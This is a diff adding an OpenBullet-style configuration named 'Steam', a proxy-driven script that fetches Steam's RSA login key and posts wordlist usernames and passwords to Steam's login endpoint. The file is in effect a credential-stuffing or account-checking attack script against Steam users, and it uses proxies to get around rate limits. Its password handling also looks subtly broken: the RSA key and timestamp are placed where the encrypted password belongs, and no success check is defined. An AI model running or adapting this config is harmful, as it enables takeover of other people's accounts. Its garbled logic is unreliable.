@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Steam",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-25T00:40:56.8422988+00:00",
+  "AdditionalInfo": "",
+  "Author": "Train",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get REQUEST GET "https://store.steampowered.com/login/?l=english" AutoRedirect=TRUE 
+  CONTENT "username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#post REQUEST POST "https://store.steampowered.com/login/getrsakey/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "publickey_mod\":\"" "\"" Recursive=FALSE -> VAR "publicKey" "" "" 
+PARSE "<SOURCE>" LR "timestamp\":\"" "\"" Recursive=FALSE -> VAR "rsaTimestamp" "" "" 
+PARSE "<SOURCE>" LR "publickey_exp\":\"" "\"" Recursive=FALSE -> VAR "rsaExp" "" "" 
+FUNCTION Translate 
+  "<RSAKeyValue><Modulus><publicKey></Modulus><Exponent>010001</Exponent></RSAKeyValue>" -> VAR "RSA" 
+REQUEST POST "https://store.steampowered.com/login/dologin/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&emailauth=&captchagid=&captcha_text=&emailsteamid=&password=<RSA><rsaTimestamp>&remember_login=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
